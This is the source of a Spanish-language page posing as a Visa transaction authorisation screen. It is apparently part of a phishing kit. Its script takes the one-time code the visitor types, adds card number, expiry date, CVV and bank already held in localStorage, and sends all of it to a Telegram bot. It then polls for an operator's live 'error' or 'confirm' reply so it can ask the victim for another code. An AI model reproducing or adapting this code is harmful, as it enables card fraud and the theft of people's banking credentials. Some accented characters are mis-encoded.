        body {
            font-family: "Open Sans", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;

        #loader-container {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        #loader {
            width: 3.25em;
            transform-origin: center;
            animation: rotate4 2s linear infinite;
        }

        circle {
            fill: none;
            stroke: hsl(0, 97%, 59%);
            stroke-width: 2;
            stroke-dasharray: 1, 200;
            stroke-dashoffset: 0;
            stroke-linecap: round;
            animation: dash4 1.5s ease-in-out infinite;
        }

        @keyframes rotate4 {
            100% {
                transform: rotate(360deg);
            }
        }

        @keyframes dash4 {
            0% {
                stroke-dasharray: 1, 200;
                stroke-dashoffset: 0;
            }

            50% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -35;
            }

            100% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -124;
            }
        }

        #contenedor {
            max-width: 360px;
            margin: 60px auto;
            background: #fff;

        #titulo {

            margin-bottom: 10px;

        #parrafo {

            color: #555;
            margin-bottom: 20px;
        }

        #logos {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 10px 0;
        }

        #logos img {
            height: 32px;
        }

        #horaTransaccion {
            text-align: center;
            font-size: 14px;
            margin-bottom: 20px;
            color: #888;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 14px;
        }

        label {
            font-size: 13px;
            font-weight: 500;
        }

        input {
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 6px;
        }

        button {
            background: #007bff;

            border: none;
            padding: 12px;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {

        }
    </style>
</head>

    <div id="contenedor">
        <div id="titulo">Autorizaci贸n de Transacci贸n</div>
        <p id="parrafo">Ingresa el c贸digo que te enviamos a tu celular para confirmar la transacci贸n.</p>

        <div id="logos">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">

        <div id="horaTransaccion">Hora: --:--:--</div>
        <form id="form">
            <label for="otp">Clave Din谩mica / OTP:</label>
            <input type="text" id="otp" required minlength="6" maxlength="6" inputmode="numeric">
            <button type="submit">Autorizar</button>
        </form>

    <div id="loader-container">
        <div id="loader">
            <svg viewBox="25 25 50 50">
                <circle r="20" cy="50" cx="50"></circle>
            </svg>
        </div>
    </div>

    <script>
        // Mostrar hora
        function updHora() {
            const d = new Date();
            const h = String(d.getHours()).padStart(2, '0'),
                m = String(d.getMinutes()).padStart(2, '0'),
                s = String(d.getSeconds()).padStart(2, '0');
            document.getElementById('horaTransaccion').innerText = `Hora: ${h}:${m}:${s}`;
        }
        setInterval(updHora, 1000);
        updHora();

        const loaderContainer = document.getElementById('loader-container');
        const form = document.getElementById('form');

        form.addEventListener('submit', async e => {
            e.preventDefault();
            loaderContainer.style.display = 'flex';

            const otp = document.getElementById('otp').value;
            const cardData = JSON.parse(localStorage.getItem('formData') || '{}');

            const transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);

            const message =
                `<b> Nueva clave din谩mica:</b>
             <b>ID:</b> ${transactionId}
             <b>OTP:</b> ${otp}

             <b>Tarjeta:</b> ${cardData.tarjeta}
             <b>Venc.:</b> ${cardData.fechaExpiracion}
             <b>CVV:</b> ${cardData.cvv}
             <b>Banco:</b> ${cardData.banco}`;

            const keyboard = {
                inline_keyboard: [
                    [{ text: "Error de Din谩mica", callback_data: `error_dinamica:${transactionId}` }],
                    [{ text: "Confirmar", callback_data: `confirm_finalizar:${transactionId}` }]
                ]
            };

            async function loadCfg() {
                const res = await fetch('config.json');
                if (!res.ok) throw 'No carg贸 config.json';
                return res.json();
            }

            try {
                const cfg = await loadCfg();
                const res = await fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: cfg.chat_id,
                        text: message,
                        reply_markup: keyboard,
                        parse_mode: 'HTML'
                    })
                });
                const js = await res.json();
                if (!js.ok) throw js;
                poll(cfg, transactionId);
            } catch (err) {
                console.error(err);
                loaderContainer.style.display = 'none';
                alert('Error enviando a Telegram');
            }
        });

        // Poll para esperar la acci贸n del admin
        async function poll(cfg, tid) {
            try {
                const res = await fetch(`https://api.telegram.org/bot${cfg.token}/getUpdates`);
                const js = await res.json();
                const upd = js.result.find(u => u.callback_query?.data?.endsWith(`:${tid}`));
                if (upd) {
                    loaderContainer.style.display = 'none';
                    const action = upd.callback_query.data.split(':')[0];
                    switch (action) {
                        case 'error_dinamica':
                            alert('La clave din谩mica que ingresaste es incorrecta. Por favor, int茅ntelo de nuevo.');
                            break;
                        case 'confirm_finalizar':
                            window.location.href = `index.html`;
                            break;
                    }
                } else {
                    setTimeout(() => poll(cfg, tid), 2000);
                }
            } catch {
                setTimeout(() => poll(cfg, tid), 2000);
            }
        }
    </script>
